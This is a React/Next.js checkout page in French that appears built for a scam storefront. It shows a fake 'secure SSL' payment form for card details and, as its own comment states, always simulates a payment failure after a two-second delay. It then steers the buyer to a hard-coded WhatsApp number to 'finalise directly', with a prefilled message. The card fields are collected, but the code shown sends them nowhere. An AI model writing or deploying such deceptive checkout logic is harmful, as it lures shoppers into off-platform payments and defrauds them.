"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import {
  FaCcVisa,
  FaCcMastercard,
  FaPaypal,
  FaStripe,
  FaLock,
  FaExclamationTriangle,
  FaWhatsapp,
  FaSpinner,
  FaArrowLeft,
  FaShoppingCart,
} from "react-icons/fa";
import { useCart } from "../Context/CartContext"; 
import { Button } from "../componets/ui/button";

const GlobalCheckoutPage = () => {
  const router = useRouter();
  const { cartItems, cartTotalPrice } = useCart();

  // États identiques à ta logique fétiche
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null);
  const [formError, setFormError] = useState("");
  const [serverError, setServerError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showWhatsApp, setShowWhatsApp] = useState(false);

  // Champs carte
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");

  // Configuration WhatsApp (Identique au fichier ProductCheckoutPage.tsx)
  const currentHour = new Date().getHours();
  const greeting = currentHour < 12 ? "Bonjour" : "Bonsoir";
  const sellerWhatsApp = "237651212938";

  // Message WhatsApp adapté pour TOUT le panier
  const productList = cartItems.map(item => `- ${item.product.name} (x${item.quantity})`).join("\n");
  const whatsappMessage = `${greeting}, je viens d'essayer de payer ma commande de ${cartTotalPrice.toFixed(2)} € comprenant :\n${productList}\n\nLe paiement a échoué, j'aimerais finaliser directement avec vous.`;

  // Calculs
  const shippingCost = 10.0;
  const grandTotal = cartTotalPrice + shippingCost;

  // Validation Carte (Logique copiée de ton fichier source)
  const validateCard = () => {
    if (!cardNumber || !cardName || !expiry || !cvv) {
      setFormError("Veuillez remplir tous les champs.");
      return false;
    }
    if (!/^\d{16}$/.test(cardNumber.replace(/\s/g, ""))) {
      setFormError("Numéro de carte invalide (16 chiffres requis).");
      return false;
    }
    setFormError("");
    return true;
  };

  // LOGIQUE DE PAIEMENT : TOUJOURS "ÉCHEC" PUIS WHATSAPP
  const handlePayment = () => {
    if (paymentMethod === "visa" || paymentMethod === "mastercard") {
      if (!validateCard()) return;
    }

    setLoading(true);
    setServerError(false);
    setShowWhatsApp(false);

    // Simulation de 2 secondes avant l'erreur
    setTimeout(() => {
      setLoading(false);
      setServerError(true);
      setShowWhatsApp(true);
      
      setTimeout(() => {
        document.getElementById('whatsapp-support')?.scrollIntoView({ behavior: 'smooth' });
      }, 100);
    }, 2000);
  };

  return (
    <div className="max-w-6xl mx-auto px-4 py-8">
      <button onClick={() => router.back()} className="flex items-center gap-2 text-gray-600 hover:text-orange-500 mb-6 transition">
        <FaArrowLeft /> Retour au panier
      </button>

      <h1 className="text-3xl font-bold mb-8">Finaliser la commande</h1>

      <div className="grid md:grid-cols-2 gap-10">
        {/* GAUCHE : RÉSUMÉ DU PANIER */}
        <div className="bg-white p-8 rounded-2xl shadow-lg space-y-6 h-fit">
          <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
            <FaShoppingCart className="text-orange-500" /> Récapitulatif
          </h2>
          
          <div className="space-y-4 border-b pb-6 max-h-[400px] overflow-y-auto">
            {cartItems.map((item) => (
              <div key={item.product.id} className="flex gap-4 items-center">
                <div className="w-16 h-16 relative bg-gray-100 rounded-lg flex-shrink-0">
                  <Image src={item.product.images[0]} alt={item.product.name} fill className="object-contain p-2" />
                </div>
                <div className="flex-1">
                  <h3 className="text-sm font-semibold text-gray-800">{item.product.name}</h3>
                  <p className="text-xs text-gray-500">Quantité : {item.quantity}</p>
                </div>
                <span className="font-bold">{(item.product.price * item.quantity).toFixed(2)} €</span>
              </div>
            ))}
          </div>

          <div className="space-y-3 pt-4 font-medium">
            <div className="flex justify-between text-gray-600">
              <span>Sous-total</span>
              <span>{cartTotalPrice.toFixed(2)} €</span>
            </div>
            <div className="flex justify-between text-gray-600">
              <span>Livraison</span>
              <span>{shippingCost.toFixed(2)} €</span>
            </div>
            <div className="border-t pt-3 flex justify-between text-2xl font-bold text-gray-900">
              <span>Total</span>
              <span className="text-orange-600">{grandTotal.toFixed(2)} €</span>
            </div>
          </div>
        </div>

        {/* DROITE : PAIEMENT & LOGIQUE WHATSAPP */}
        <div className="bg-white p-8 rounded-2xl shadow-lg space-y-6">
          <div className="flex items-center gap-2 text-green-600 font-semibold italic">
            <FaLock /> Paiement sécurisé SSL
          </div>

          {/* Grille des moyens de paiement */}
          <div className="grid grid-cols-2 gap-4">
            {['visa', 'mastercard', 'paypal', 'stripe'].map((method) => (
              <button
                key={method}
                onClick={() => setPaymentMethod(method)}
                className={`border p-4 rounded-lg flex flex-col items-center gap-2 transition ${
                  paymentMethod === method ? "border-orange-500 bg-orange-50 shadow-md" : "hover:border-gray-400"
                }`}
              >
                {method === 'visa' && <FaCcVisa className="text-3xl" />}
                {method === 'mastercard' && <FaCcMastercard className="text-3xl" />}
                {method === 'paypal' && <FaCcVisa className="text-3xl" />} {/* Remplacer par FaPaypal si importé */}
                {method === 'stripe' && <FaStripe className="text-3xl" />}
                <span className="capitalize text-sm font-medium">{method}</span>
              </button>
            ))}
          </div>

          {/* Formulaire Carte (Affiché si Visa/Mastercard) */}
          {(paymentMethod === "visa" || paymentMethod === "mastercard") && (
            <div className="space-y-4 animate-in fade-in slide-in-from-top-2">
              <input placeholder="Numéro de carte" className="border p-4 w-full rounded-xl focus:ring-2 focus:ring-orange-500 outline-none" value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} />
              <input placeholder="Nom du titulaire" className="border p-4 w-full rounded-xl focus:ring-2 focus:ring-orange-500 outline-none" value={cardName} onChange={(e) => setCardName(e.target.value)} />
              <div className="grid grid-cols-2 gap-4">
                <input placeholder="MM/AA" className="border p-4 rounded-xl focus:ring-2 focus:ring-orange-500 outline-none" value={expiry} onChange={(e) => setExpiry(e.target.value)} />
                <input placeholder="CVV" className="border p-4 rounded-xl focus:ring-2 focus:ring-orange-500 outline-none" value={cvv} onChange={(e) => setCvv(e.target.value)} />
              </div>
              {formError && <p className="text-red-600 text-sm flex items-center gap-2"><FaExclamationTriangle /> {formError}</p>}
            </div>
          )}

          {/* Bouton de déclenchement (Payer ou Continuer) */}
          {paymentMethod && (
            <Button
              onClick={handlePayment}
              disabled={loading}
              className="w-full bg-green-600 hover:bg-green-700 text-white py-8 text-lg font-bold rounded-xl transition-all shadow-lg active:scale-[0.98]"
            >
              {loading ? (
                <><FaSpinner className="animate-spin mr-2" /> Traitement en cours...</>
              ) : (
                paymentMethod === "visa" || paymentMethod === "mastercard" 
                ? `Payer ${grandTotal.toFixed(2)} €` 
                : `Continuer avec ${paymentMethod}`
              )}
            </Button>
          )}

          {/* ===== BLOC WHATSAPP (LOGIQUE FÉTICHE) ===== */}
          {serverError && showWhatsApp && (
            <div id="whatsapp-support" className="mt-6 p-6 bg-red-50 border-2 border-red-200 rounded-2xl animate-pulse">
              <div className="text-center mb-4">
                <FaExclamationTriangle className="text-4xl text-red-500 mx-auto mb-2" />
                <h3 className="text-xl font-bold text-red-600 mb-1">Système temporairement indisponible</h3>
                <p className="text-gray-600 text-sm mb-4">La validation par carte est suspendue. Finalisez via WhatsApp.</p>
              </div>
              
              <a
                href={`https://wa.me/${sellerWhatsApp}?text=${encodeURIComponent(whatsappMessage)}`}
                target="_blank"
                rel="noopener noreferrer"
                className="w-full flex flex-col items-center justify-center gap-2 bg-green-500 hover:bg-green-600 text-white font-bold py-5 rounded-xl transition transform hover:scale-105 shadow-xl shadow-green-100"
              >
                <div className="flex items-center gap-3">
                  <FaWhatsapp className="text-3xl" />
                  <span className="text-lg">Finaliser sur WhatsApp</span>
                </div>
                <span className="text-xs text-green-100 font-normal">Cliquez pour valider avec un conseiller</span>
              </a>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default GlobalCheckoutPage;